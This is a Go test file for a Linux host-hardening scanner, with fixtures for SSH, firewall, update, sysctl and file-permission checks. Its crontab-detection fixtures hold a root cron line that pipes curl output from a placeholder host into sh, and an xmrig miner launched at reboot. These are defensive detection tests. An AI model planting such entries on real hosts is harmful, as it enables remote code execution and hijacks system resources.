package checks

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/tb12as/kurogane/internal/collector"
	"github.com/tb12as/kurogane/internal/executor"
	"github.com/tb12as/kurogane/internal/hostfs"
)

// Fixture describes a host: files (path ending in "/" = dir), modes, fake command outputs and service seams.
type Fixture struct {
	Files  map[string]string
	Modes  map[string]os.FileMode
	Out    map[string]string
	Errs   map[string]error
	SSH    map[string]string
	Rocky  bool
	Listen []Listener
	BF     bool
	Ports  []int
}

const (
	ubuntuRelease = "ID=ubuntu\nVERSION_ID=\"22.04\"\n"
	rockyRelease  = "ID=\"rocky\"\nID_LIKE=\"rhel centos fedora\"\nVERSION_ID=\"9.3\"\n"
)

// Setup builds the fixture tree under a temp root and returns an Env wired to a fake executor.
func Setup(t *testing.T, f Fixture) (*Env, *executor.Fake) {
	t.Helper()
	root := t.TempDir()
	old := hostfs.Root
	hostfs.Root = root
	t.Cleanup(func() { hostfs.Root = old })
	files := map[string]string{"/etc/os-release": ubuntuRelease}
	if f.Rocky {
		files["/etc/os-release"] = rockyRelease
	}
	for k, v := range f.Files {
		files[k] = v
	}
	for p, c := range files {
		real := filepath.Join(root, p)
		if strings.HasSuffix(p, "/") {
			must(t, os.MkdirAll(real, 0o755))
			continue
		}
		must(t, os.MkdirAll(filepath.Dir(real), 0o755))
		must(t, os.WriteFile(real, []byte(c), 0o644))
	}
	for p, m := range f.Modes {
		must(t, os.Chmod(filepath.Join(root, p), m))
	}
	fx := executor.NewFake()
	for k, v := range f.Out {
		fx.Outputs[k] = v
	}
	for k, v := range f.Errs {
		fx.Errors[k] = v
	}
	e := &Env{Ex: fx, ExpectedPorts: f.Ports, ConfigPath: "/etc/kurogane/config.yaml",
		Bruteforce: func() bool { return f.BF }}
	if f.SSH != nil {
		e.Settings = func(context.Context) (map[string]string, error) { return f.SSH, nil }
	}
	if f.Listen != nil {
		e.Latest = func() *collector.Snapshot { return &collector.Snapshot{Conns: collector.ConnInfo{Listening: f.Listen}} }
	}
	return e, fx
}

func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}

func find(e *Env, id string) Check {
	for _, c := range All(e) {
		if c.ID() == id {
			return c
		}
	}
	return nil
}

// ExitErr returns a real *executor.RunError with the given exit code.
func ExitErr(code int) error {
	err := exec.Command("sh", "-c", "exit "+string(rune('0'+code))).Run()
	return &executor.RunError{Cmd: "test", Err: err}
}

var sshd = map[string]string{"/etc/ssh/sshd_config": ""}

func TestCatalogComplete(t *testing.T) {
	want := strings.Fields(`SSH-ROOT-LOGIN SSH-PASSWORD-AUTH SSH-CIPHERS SSH-MAXAUTHTRIES SSH-PORT-NONDEFAULT SSH-X11
		SSH-EMPTY-PASSWORDS SSH-LOGINGRACE SSH-CLIENTALIVE ACC-UID0 ACC-EMPTY-PASSWD ACC-PASS-AGING ACC-SUDO-NOPASSWD
		FW-ACTIVE FW-DEFAULT-DENY FW-EXPECTED-PORTS UPD-UNATTENDED UPD-PENDING-SECURITY UPD-REBOOT-PENDING SYS-SYNCOOKIES
		SYS-RP-FILTER SYS-ICMP-REDIRECTS SYS-SEND-REDIRECTS SYS-SOURCE-ROUTE SYS-ASLR SYS-SUID-DUMPABLE SYS-DMESG-RESTRICT
		FILE-SHADOW-PERMS FILE-PASSWD-PERMS FILE-SSHD-PERMS FILE-WORLD-WRITABLE FILE-SUID-UNEXPECTED SVC-INSECURE
		SVC-UNUSED SVC-LISTENING-REVIEW LOG-JOURNALD-PERSISTENT LOG-AUDITD LOG-LOGROTATE IPS-BRUTEFORCE FS-TMP-NOEXEC
		FS-CORE-DUMPS TIME-NTP-SYNC MAL-ROOTKIT-SCANNER MAL-CRONTAB TLS-CERT-VALID
		WEB-CONFIG-VALID WEB-SERVER-TOKENS WEB-TLS-PROTOCOLS WEB-DIR-LISTING
		REDIS-NOT-EXPOSED REDIS-AUTH REDIS-PROTECTED-MODE REDIS-DANGEROUS-COMMANDS`)
	var got []string
	for _, c := range All(&Env{}) {
		m := c.Info()
		if m.Title == "" || m.Category == "" || Rank(m.Severity) == 0 || m.Rationale == "" || m.Remediation == "" ||
			m.AutoFix == "" {
			t.Errorf("%s: incomplete metadata %+v", c.ID(), m)
		}
		got = append(got, c.ID())
	}
	sort.Strings(want)
	if strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("catalog mismatch:\n got %v\nwant %v", got, want)
	}
}

type scanCase struct {
	name string
	id   string
	f    Fixture
	want string
}

func scanCases() []scanCase {
	pub := func(port int, proto string) Listener { return Listener{Proto: proto, Addr: "0.0.0.0", Port: port} }
	ufw := map[string]string{"/usr/sbin/ufw": ""}
	cs := []scanCase{
		{"no sshd", "SSH-ROOT-LOGIN", Fixture{SSH: map[string]string{"permitrootlogin": "yes"}}, NA},
		{"no settings", "SSH-ROOT-LOGIN", Fixture{Files: sshd}, Error},
		{"sshd -T fallback", "SSH-ROOT-LOGIN", Fixture{Files: sshd, Out: map[string]string{"sshd -T": "permitrootlogin no\nport 22\n"}}, Pass},
		{"pass", "SSH-ROOT-LOGIN", Fixture{Files: sshd, SSH: map[string]string{"permitrootlogin": "no"}}, Pass},
		{"fail", "SSH-ROOT-LOGIN", Fixture{Files: sshd, SSH: map[string]string{"permitrootlogin": "prohibit-password"}}, Fail},
		{"pass", "SSH-PASSWORD-AUTH", Fixture{Files: sshd, SSH: map[string]string{"passwordauthentication": "no"}}, Pass},
		{"fail", "SSH-PASSWORD-AUTH", Fixture{Files: sshd, SSH: map[string]string{"port": "22"}}, Fail},
		{"pass", "SSH-CIPHERS", Fixture{Files: sshd, SSH: map[string]string{"ciphers": "aes256-gcm@openssh.com",
			"macs": "hmac-sha2-256-etm@openssh.com", "kexalgorithms": "curve25519-sha256"}}, Pass},
		{"fail defaults", "SSH-CIPHERS", Fixture{Files: sshd, SSH: map[string]string{"port": "22"}}, Fail},
		{"fail cbc", "SSH-CIPHERS", Fixture{Files: sshd, SSH: map[string]string{"ciphers": "aes128-cbc",
			"macs": "hmac-sha2-256", "kexalgorithms": "curve25519-sha256"}}, Fail},
		{"pass", "SSH-MAXAUTHTRIES", Fixture{Files: sshd, SSH: map[string]string{"maxauthtries": "3"}}, Pass},
		{"fail", "SSH-MAXAUTHTRIES", Fixture{Files: sshd, SSH: map[string]string{"maxauthtries": "6"}}, Fail},
		{"pass", "SSH-PORT-NONDEFAULT", Fixture{Files: sshd, SSH: map[string]string{"port": "2222"}}, Pass},
		{"fail", "SSH-PORT-NONDEFAULT", Fixture{Files: sshd, SSH: map[string]string{"port": "22"}}, Fail},
		{"pass", "SSH-X11", Fixture{Files: sshd, SSH: map[string]string{"x11forwarding": "no"}}, Pass},
		{"fail", "SSH-X11", Fixture{Files: sshd, SSH: map[string]string{"x11forwarding": "yes"}}, Fail},
		{"pass", "SSH-EMPTY-PASSWORDS", Fixture{Files: sshd, SSH: map[string]string{"permitemptypasswords": "no"}}, Pass},
		{"fail", "SSH-EMPTY-PASSWORDS", Fixture{Files: sshd, SSH: map[string]string{"permitemptypasswords": "yes"}}, Fail},
		{"pass", "SSH-LOGINGRACE", Fixture{Files: sshd, SSH: map[string]string{"logingracetime": "1m"}}, Pass},
		{"fail", "SSH-LOGINGRACE", Fixture{Files: sshd, SSH: map[string]string{"logingracetime": "120"}}, Fail},
		{"pass", "SSH-CLIENTALIVE", Fixture{Files: sshd, SSH: map[string]string{"clientaliveinterval": "300"}}, Pass},
		{"fail", "SSH-CLIENTALIVE", Fixture{Files: sshd, SSH: map[string]string{"clientaliveinterval": "0"}}, Fail},

		{"pass", "ACC-UID0", Fixture{Files: map[string]string{"/etc/passwd": "root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/sh\n"}}, Pass},
		{"fail", "ACC-UID0", Fixture{Files: map[string]string{"/etc/passwd": "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/:/bin/sh\n"}}, Fail},
		{"pass", "ACC-EMPTY-PASSWD", Fixture{Files: map[string]string{"/etc/shadow": "root:$6$abc:19000:0:99999:7:::\nbob:!:19000::::::\n"}}, Pass},
		{"fail", "ACC-EMPTY-PASSWD", Fixture{Files: map[string]string{"/etc/shadow": "root:$6$abc:19000::::::\nbob::19000::::::\n"}}, Fail},
		{"pass", "ACC-PASS-AGING", Fixture{Files: map[string]string{"/etc/login.defs": "PASS_MAX_DAYS\t90\n"}}, Pass},
		{"fail", "ACC-PASS-AGING", Fixture{Files: map[string]string{"/etc/login.defs": "PASS_MAX_DAYS\t99999\n"}}, Fail},
		{"pass", "ACC-SUDO-NOPASSWD", Fixture{Files: map[string]string{"/etc/sudoers": "root ALL=(ALL:ALL) ALL\n# x NOPASSWD: ALL\n"}}, Pass},
		{"fail", "ACC-SUDO-NOPASSWD", Fixture{Files: map[string]string{"/etc/sudoers": "root ALL=(ALL:ALL) ALL\n",
			"/etc/sudoers.d/90-cloud-init-users": "ubuntu ALL=(ALL) NOPASSWD:ALL\n"}}, Fail},

		{"ufw pass", "FW-ACTIVE", Fixture{Files: ufw, Out: map[string]string{"ufw status verbose": "Status: active\nDefault: deny (incoming), allow (outgoing)\n"}}, Pass},
		{"ufw fail", "FW-ACTIVE", Fixture{Files: ufw, Out: map[string]string{"ufw status verbose": "Status: inactive\n"}}, Fail},
		{"nft pass", "FW-ACTIVE", Fixture{Files: map[string]string{"/usr/sbin/nft": ""}, Out: map[string]string{
			"nft -j list ruleset": `{"nftables":[{"chain":{"family":"inet","table":"filter","name":"input","hook":"input","policy":"drop"}}]}`}}, Pass},
		{"none", "FW-ACTIVE", Fixture{}, Fail},
		{"ufw pass", "FW-DEFAULT-DENY", Fixture{Files: ufw, Out: map[string]string{"ufw status verbose": "Status: active\nDefault: deny (incoming), allow (outgoing)\n"}}, Pass},
		{"ufw fail", "FW-DEFAULT-DENY", Fixture{Files: ufw, Out: map[string]string{"ufw status verbose": "Status: active\nDefault: allow (incoming), allow (outgoing)\n"}}, Fail},
		{"firewalld fail", "FW-DEFAULT-DENY", Fixture{Files: map[string]string{"/usr/bin/firewall-cmd": ""}, Out: map[string]string{
			"firewall-cmd --state": "running\n", "firewall-cmd --list-all": "public (active)\n  target: ACCEPT\n"}}, Fail},
		{"firewalld zone unreadable", "FW-DEFAULT-DENY", Fixture{Files: map[string]string{"/usr/bin/firewall-cmd": ""},
			Out:  map[string]string{"firewall-cmd --state": "running\n"},
			Errs: map[string]error{"firewall-cmd --list-all": errors.New("permission denied")}}, Error},
		{"firewalld pass", "FW-DEFAULT-DENY", Fixture{Files: map[string]string{"/usr/bin/firewall-cmd": ""}, Out: map[string]string{
			"firewall-cmd --state": "running\n", "firewall-cmd --list-all": "public (active)\n  target: default\n"}}, Pass},
		{"pass", "FW-EXPECTED-PORTS", Fixture{Ports: []int{80}, Listen: []Listener{pub(22, "tcp"), pub(80, "tcp"),
			{Proto: "tcp", Addr: "127.0.0.1", Port: 5432}}}, Pass},
		{"fail", "FW-EXPECTED-PORTS", Fixture{Listen: []Listener{pub(22, "tcp"), pub(6379, "tcp")}}, Fail},
		{"ss fallback fail", "FW-EXPECTED-PORTS", Fixture{Out: map[string]string{
			"ss -tlnpH": `LISTEN 0 511 0.0.0.0:6379 0.0.0.0:* users:(("redis-server",pid=9,fd=6))`}}, Fail},

		{"ubuntu pass", "UPD-UNATTENDED", Fixture{Files: map[string]string{autoUpgrades: "APT::Periodic::Unattended-Upgrade \"1\";\n"},
			Out: map[string]string{"dpkg-query -W -f=${Status} unattended-upgrades": "install ok installed"}}, Pass},
		{"ubuntu fail", "UPD-UNATTENDED", Fixture{}, Fail},
		{"rocky pass", "UPD-UNATTENDED", Fixture{Rocky: true, Out: map[string]string{"systemctl is-enabled dnf-automatic-install.timer": "enabled\n"}}, Pass},
		{"rocky fail", "UPD-UNATTENDED", Fixture{Rocky: true, Errs: map[string]error{"rpm -q dnf-automatic": errors.New("not installed")}}, Fail},
		{"ubuntu pass", "UPD-PENDING-SECURITY", Fixture{Out: map[string]string{"apt-get -s upgrade": "Inst foo [1] (2 Ubuntu:22.04/jammy-updates [amd64])\n"}}, Pass},
		{"ubuntu fail", "UPD-PENDING-SECURITY", Fixture{Out: map[string]string{
			"apt-get -s upgrade": "Inst openssl [3.0.2-0ubuntu1.10] (3.0.2-0ubuntu1.12 Ubuntu:22.04/jammy-security [amd64])\n"}}, Fail},
		{"rocky fail", "UPD-PENDING-SECURITY", Fixture{Rocky: true, Out: map[string]string{
			"dnf -q --cacheonly updateinfo list --security": "RHSA-2024:1 Important/Sec. openssl-3.0.7-25.el9.x86_64\n"}}, Fail},
		{"rocky pass", "UPD-PENDING-SECURITY", Fixture{Rocky: true}, Pass},
		{"ubuntu pass", "UPD-REBOOT-PENDING", Fixture{}, Pass},
		{"ubuntu fail", "UPD-REBOOT-PENDING", Fixture{Files: map[string]string{"/run/reboot-required": "", "/run/reboot-required.pkgs": "linux-image\n"}}, Fail},
		{"rocky pass", "UPD-REBOOT-PENDING", Fixture{Rocky: true}, Pass},
		{"rocky fail", "UPD-REBOOT-PENDING", Fixture{Rocky: true, Errs: map[string]error{"needs-restarting -r": ExitErr(1)}}, Fail},

		{"pass", "FILE-WORLD-WRITABLE", Fixture{Files: map[string]string{"/etc/hosts": "x", "/usr/bin/ls": ""}}, Pass},
		{"fail", "FILE-WORLD-WRITABLE", Fixture{Files: map[string]string{"/usr/bin/evil": ""}, Modes: map[string]os.FileMode{"/usr/bin/evil": 0o777}}, Fail},
		{"pass", "FILE-SUID-UNEXPECTED", Fixture{Files: map[string]string{"/usr/bin/passwd": ""}, Modes: map[string]os.FileMode{"/usr/bin/passwd": 0o755 | os.ModeSetuid}}, Pass},
		{"fail", "FILE-SUID-UNEXPECTED", Fixture{Files: map[string]string{"/usr/bin/backdoor": ""}, Modes: map[string]os.FileMode{"/usr/bin/backdoor": 0o755 | os.ModeSetuid}}, Fail},

		{"pass", "SVC-INSECURE", Fixture{Listen: []Listener{pub(22, "tcp")}}, Pass},
		{"fail listener", "SVC-INSECURE", Fixture{Listen: []Listener{pub(23, "tcp")}}, Fail},
		{"fail unit", "SVC-INSECURE", Fixture{Out: map[string]string{"systemctl is-active " + strings.Join(insecureUnits, " "): "inactive\ninactive\ninactive\nactive\n"}}, Fail},
		{"pass", "SVC-UNUSED", Fixture{}, Pass},
		{"fail", "SVC-UNUSED", Fixture{Out: map[string]string{"systemctl is-active avahi-daemon cups rpcbind nfs-server": "active\ninactive\ninactive\ninactive\n"}}, Fail},
		{"nfs exports in use", "SVC-UNUSED", Fixture{Files: map[string]string{"/etc/exports": "/srv *(ro)\n"},
			Out: map[string]string{"systemctl is-active avahi-daemon cups rpcbind nfs-server": "inactive\ninactive\nactive\nactive\n"}}, Pass},
		{"pass", "SVC-LISTENING-REVIEW", Fixture{Listen: []Listener{pub(22, "tcp")}}, Pass},
		{"no data", "SVC-LISTENING-REVIEW", Fixture{}, NA},

		{"pass", "LOG-JOURNALD-PERSISTENT", Fixture{Files: map[string]string{"/etc/systemd/journald.conf": "[Journal]\nStorage=persistent\n"}}, Pass},
		{"auto with dir", "LOG-JOURNALD-PERSISTENT", Fixture{Files: map[string]string{"/etc/systemd/journald.conf": "[Journal]\n#Storage=auto\n", "/var/log/journal/": ""}}, Pass},
		{"fail", "LOG-JOURNALD-PERSISTENT", Fixture{Files: map[string]string{"/etc/systemd/journald.conf": "[Journal]\n",
			"/etc/systemd/journald.conf.d/x.conf": "[Journal]\nStorage=volatile\n"}}, Fail},
		{"pass", "LOG-AUDITD", Fixture{Files: map[string]string{"/usr/sbin/auditd": ""}, Out: map[string]string{"systemctl is-active auditd": "active\n"}}, Pass},
		{"fail", "LOG-AUDITD", Fixture{}, Fail},
		{"pass", "LOG-LOGROTATE", Fixture{Files: map[string]string{"/etc/logrotate.conf": "", "/etc/cron.daily/logrotate": ""}}, Pass},
		{"fail", "LOG-LOGROTATE", Fixture{}, Fail},
		{"pass", "IPS-BRUTEFORCE", Fixture{BF: true}, Pass},
		{"fail2ban", "IPS-BRUTEFORCE", Fixture{Out: map[string]string{"systemctl is-active fail2ban": "active\n"}}, Pass},
		{"fail", "IPS-BRUTEFORCE", Fixture{}, Fail},
		{"pass", "FS-TMP-NOEXEC", Fixture{Files: map[string]string{"/proc/self/mounts": "tmpfs /tmp tmpfs rw,nosuid,nodev,noexec 0 0\n"}}, Pass},
		{"fail", "FS-TMP-NOEXEC", Fixture{Files: map[string]string{"/proc/self/mounts": "tmpfs /tmp tmpfs rw,nodev 0 0\n"}}, Fail},
		{"na", "FS-TMP-NOEXEC", Fixture{Files: map[string]string{"/proc/self/mounts": "/dev/sda1 / ext4 rw 0 0\n"}}, NA},
		{"pass", "FS-CORE-DUMPS", Fixture{Files: map[string]string{"/etc/security/limits.conf": "*  hard  core  0\n"}}, Pass},
		{"systemd", "FS-CORE-DUMPS", Fixture{Files: map[string]string{"/etc/systemd/coredump.conf": "[Coredump]\nStorage=none\n"}}, Pass},
		{"fail", "FS-CORE-DUMPS", Fixture{}, Fail},
		{"pass", "TIME-NTP-SYNC", Fixture{Out: map[string]string{"timedatectl show": "NTP=yes\nNTPSynchronized=yes\n"}}, Pass},
		{"fail", "TIME-NTP-SYNC", Fixture{Out: map[string]string{"timedatectl show": "NTP=no\nNTPSynchronized=no\n"}}, Fail},
		{"chrony", "TIME-NTP-SYNC", Fixture{Out: map[string]string{"chronyc tracking": "Leap status     : Normal\n"}}, Pass},
		{"pass", "MAL-ROOTKIT-SCANNER", Fixture{Files: map[string]string{"/usr/bin/rkhunter": ""}}, Pass},
		{"fail", "MAL-ROOTKIT-SCANNER", Fixture{}, Fail},
		{"pass", "MAL-CRONTAB", Fixture{Files: map[string]string{"/etc/crontab": "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"}}, Pass},
		{"fail", "MAL-CRONTAB", Fixture{Files: map[string]string{"/etc/cron.d/x": "* * * * * root curl -s http://x/y | sh\n"}}, Fail},
		{"fail spool", "MAL-CRONTAB", Fixture{Files: map[string]string{"/var/spool/cron/crontabs/www": "@reboot /tmp/.x/xmrig -o pool\n"}}, Fail},
	}
	// table-driven sysctl and file-mode checks
	for _, c := range All(&Env{}) {
		switch x := c.(type) {
		case *sysctlCheck:
			good, bad := map[string]string{}, map[string]string{}
			for i, w := range x.want {
				good[sysctlPath(w.k)] = w.v + "\n"
				bad[sysctlPath(w.k)] = w.v + "\n"
				if i == 0 {
					bad[sysctlPath(w.k)] = "7\n"
				}
			}
			cs = append(cs, scanCase{"pass", c.ID(), Fixture{Files: good}, Pass}, scanCase{"fail", c.ID(), Fixture{Files: bad}, Fail},
				scanCase{"missing", c.ID(), Fixture{}, NA})
		case *fileModeCheck:
			cs = append(cs,
				scanCase{"pass", c.ID(), Fixture{Files: map[string]string{x.path: ""}, Modes: map[string]os.FileMode{x.path: x.max & 0o600}}, Pass},
				scanCase{"fail", c.ID(), Fixture{Files: map[string]string{x.path: ""}, Modes: map[string]os.FileMode{x.path: 0o666}}, Fail},
				scanCase{"missing", c.ID(), Fixture{}, NA})
		}
	}
	cs = append(cs, tlsCases()...)
	cs = append(cs, webCases()...)
	cs = append(cs, redisCases()...)
	return cs
}

func TestScan(t *testing.T) {
	covered := map[string]map[string]bool{}
	for _, tc := range scanCases() {
		t.Run(tc.id+"/"+tc.name, func(t *testing.T) {
			e, _ := Setup(t, tc.f)
			c := find(e, tc.id)
			if c == nil {
				t.Fatalf("unknown check %s", tc.id)
			}
			r := c.Run(WithMemo(context.Background()))
			if r.Status != tc.want || r.CheckID != tc.id {
				t.Fatalf("status %s (%s), want %s", r.Status, r.Evidence, tc.want)
			}
			if covered[tc.id] == nil {
				covered[tc.id] = map[string]bool{}
			}
			covered[tc.id][r.Status] = true
		})
	}
	// every check needs a pass and a fail fixture (SVC-LISTENING-REVIEW is informational)
	for _, c := range All(&Env{}) {
		if !covered[c.ID()][Pass] || (!covered[c.ID()][Fail] && c.ID() != "SVC-LISTENING-REVIEW") {
			t.Errorf("%s: missing pass/fail scan test (%v)", c.ID(), covered[c.ID()])
		}
	}
}

func TestReportOnlyChecksRefuseFix(t *testing.T) {
	e, _ := Setup(t, Fixture{})
	for _, c := range All(e) {
		if c.Info().AutoFix != FixReport {
			continue
		}
		if _, err := c.Fix(context.Background(), true); !errors.Is(err, ErrNoFix) {
			t.Errorf("%s: report-only check returned %v", c.ID(), err)
		}
	}
}

func TestUnified(t *testing.T) {
	d := Unified("/f", "a\nb\nc\n", "a\nB\nc\nd\n")
	for _, s := range []string{"--- /f", "+++ /f", "@@ -1,3 +1,4 @@", "-b", "+B", "+d", " a"} {
		if !strings.Contains(d, s+"\n") {
			t.Fatalf("missing %q in\n%s", s, d)
		}
	}
	if Unified("/f", "x", "x") != "" {
		t.Fatal("identical texts must give an empty diff")
	}
}

func TestSysctlEdit(t *testing.T) {
	got := SysctlEdit("# hi\nkernel.a = 1\nkernel.b = 2\n", map[string]string{"kernel.a": "5", "kernel.c": "3"},
		[]string{"kernel.b"})
	if got != "# hi\nkernel.a = 5\nkernel.c = 3\n" {
		t.Fatalf("got %q", got)
	}
}

func TestParseSS(t *testing.T) {
	ls := parseSS(`LISTEN 0 4096 [::]:22 [::]:* users:(("sshd",pid=1,fd=4))
LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*`, "tcp")
	if len(ls) != 2 || ls[0].Port != 22 || ls[0].Process != "sshd" || !public(ls[0].Addr) || public(ls[1].Addr) {
		t.Fatalf("parse: %+v", ls)
	}
}
